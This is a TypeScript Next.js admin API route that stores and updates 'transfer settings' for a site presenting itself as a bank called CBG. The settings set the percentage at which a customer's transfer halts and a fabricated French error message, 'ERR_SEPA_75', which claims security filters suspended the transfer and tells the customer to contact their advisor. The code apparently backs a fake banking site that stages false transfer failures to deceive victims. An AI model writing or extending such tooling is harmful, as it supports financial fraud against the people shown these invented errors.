import { randomUUID } from "node:crypto";
import { eq } from "drizzle-orm";
import { NextResponse } from "next/server";
import { isAdminAuthenticated } from "@/lib/auth";
import { db } from "@/lib/db";
import { transferSettingsTable } from "@/lib/schema";

export async function GET() {
  try {
    if (!(await isAdminAuthenticated())) {
      return NextResponse.json({ success: false, message: "Non autorisé." }, { status: 401 });
    }

    const [settings] = await db
      .select()
      .from(transferSettingsTable)
      .limit(1);

    if (!settings) {
      // Create default settings
      const now = new Date().toISOString();
      const [newSettings] = await db
        .insert(transferSettingsTable)
        .values({
          id: 1,
          haltPercent: 75,
          haltMessage: "Erreur de routage bancaire interbancaire (Code: ERR_SEPA_75). Votre virement a été suspendu par les filtres de sécurité. Veuillez contacter votre conseiller bancaire CBG.",
          errorCode: "ERR_INTERBANK_ROUTING_SUSPENDED",
          updatedAt: now,
        })
        .returning();

      return NextResponse.json({ success: true, settings: newSettings });
    }

    return NextResponse.json({ success: true, settings });
  } catch (error) {
    console.error("Erreur lors de la récupération des paramètres de virement :", error);
    return NextResponse.json({ success: false, message: "Erreur serveur." }, { status: 500 });
  }
}

export async function POST(request: Request) {
  try {
    if (!(await isAdminAuthenticated())) {
      return NextResponse.json({ success: false, message: "Non autorisé." }, { status: 401 });
    }

    const body = await request.json();
    const { haltPercent, haltMessage, errorCode } = body as {
      haltPercent?: number;
      haltMessage?: string;
      errorCode?: string;
    };

    // Validation
    if (haltPercent !== undefined) {
      if (!Number.isInteger(haltPercent) || haltPercent < 1 || haltPercent > 100) {
        return NextResponse.json({ success: false, message: "Le pourcentage doit être un entier entre 1 et 100." }, { status: 400 });
      }
    }

    if (haltMessage !== undefined && (!haltMessage || haltMessage.trim().length === 0)) {
      return NextResponse.json({ success: false, message: "Le message ne peut pas être vide." }, { status: 400 });
    }

    const now = new Date().toISOString();
    const updateData: Record<string, unknown> = { updatedAt: now };

    if (haltPercent !== undefined) updateData.haltPercent = haltPercent;
    if (haltMessage !== undefined) updateData.haltMessage = haltMessage.trim();
    if (errorCode !== undefined) updateData.errorCode = errorCode.trim();

    const [existing] = await db.select().from(transferSettingsTable).limit(1);

    let result;
    if (existing) {
      result = await db
        .update(transferSettingsTable)
        .set(updateData)
        .where(eq(transferSettingsTable.id, 1))
        .returning();
    } else {
      result = await db
        .insert(transferSettingsTable)
        .values({
          id: 1,
          haltPercent: haltPercent ?? 75,
          haltMessage: haltMessage?.trim() ?? "Erreur de routage bancaire interbancaire (Code: ERR_SEPA_75). Votre virement a été suspendu par les filtres de sécurité. Veuillez contacter votre conseiller bancaire CBG.",
          errorCode: errorCode?.trim() ?? "ERR_INTERBANK_ROUTING_SUSPENDED",
          updatedAt: now,
        })
        .returning();
    }

    return NextResponse.json({ success: true, settings: result[0], message: "Paramètres de virement mis à jour avec succès." });
  } catch (error) {
    console.error("Erreur lors de la mise à jour des paramètres de virement :", error);
    return NextResponse.json({ success: false, message: "Erreur serveur." }, { status: 500 });
  }
}